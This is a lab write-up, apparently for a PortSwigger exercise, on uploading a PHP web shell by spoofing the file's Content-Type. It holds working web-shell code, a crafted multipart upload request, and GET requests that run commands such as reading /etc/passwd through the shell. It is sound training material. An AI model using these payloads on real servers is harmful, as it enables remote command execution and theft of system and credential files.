# Write-Up: Web Shell Upload via Content-Type Restriction Bypass

## Lab Description
This lab contains a vulnerable image upload function that attempts to restrict file uploads to specific MIME types. However, the verification process relies on user-controllable input, allowing a bypass. The objective is to upload a PHP web shell, use it to retrieve the contents of the file `/home/carlos/secret`, and submit the secret to solve the lab.

## Steps to Solve the Lab

### Step 1: Log in to Your Account
Use the provided credentials to log in:
- **Username:** `wiener`
- **Password:** `peter`

### Step 2: Upload an Image as Your Avatar
Navigate to your account page and upload an image as your avatar. Observe the subsequent GET request to `/files/avatars/<YOUR-IMAGE>` in Burp Suite under Proxy > HTTP history. Send this request to Burp Repeater.

### Step 3: Create the Exploit File
On your system, create a PHP file named `exploit.php` with the following content:
```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

### Step 4: Attempt to Upload the Exploit
Try to upload `exploit.php` as your avatar. Notice that the response restricts uploads to files with MIME types `image/jpeg` or `image/png`.

### Step 5: Modify the File Upload Request
In Burp Suite, locate the POST request used to upload the file (e.g., `POST /my-account/avatar`) and send it to Burp Repeater. Modify the Content-Type of the file in the request body to `image/jpeg`:
```http
------WebKitFormBoundaryIdK3RcBVxUygIHkJ
Content-Disposition: form-data; name="avatar"; filename="exploit2.php"
Content-Type: image/png

<?php system($_GET['cmd']); ?>
------WebKitFormBoundaryIdK3RcBVxUygIHkJ
Content-Disposition: form-data; name="user"
```
Send the request, and you should see a successful upload response.

### Step 6: Retrieve Carlos's Secret
In the GET request tab in Burp Repeater, replace the path with `exploit2.php` and add a query parameter to execute the `cat` command:
```http
GET /files/avatars/exploit2.php?cmd=cat+/home/carlos/secret HTTP/2
```
Send the request and capture the secret from the response.

### Step 7: Submit the Secret
Copy the secret and submit it through the lab banner to complete the task.

### Additional Commands for Exploration
You can execute other commands to gather more information:
- Retrieve password file:
  ```http
  GET /files/avatars/exploit2.php?cmd=cat+/etc/passwd HTTP/2
  ```
- Check user information:
  ```http
  GET /files/avatars/exploit2.php?cmd=id HTTP/2
  ```
- List all users:
  ```http
  GET /files/avatars/exploit2.php?cmd=getent+passwd HTTP/2
  ```
- Confirm your user:
  ```http
  GET /files/avatars/exploit2.php?cmd=whoami HTTP/2
  ```

### Note
Unfortunately, access to the `/etc/shadow` file could not be obtained because `sudo` permissions were restricted to the root user only.


![File Upload Remote Code Execution via Web Shell Upload Lab2](https://github.com/LanZeroth/Portswigger-Writeups/blob/main/Images/file-lab2a.PNG)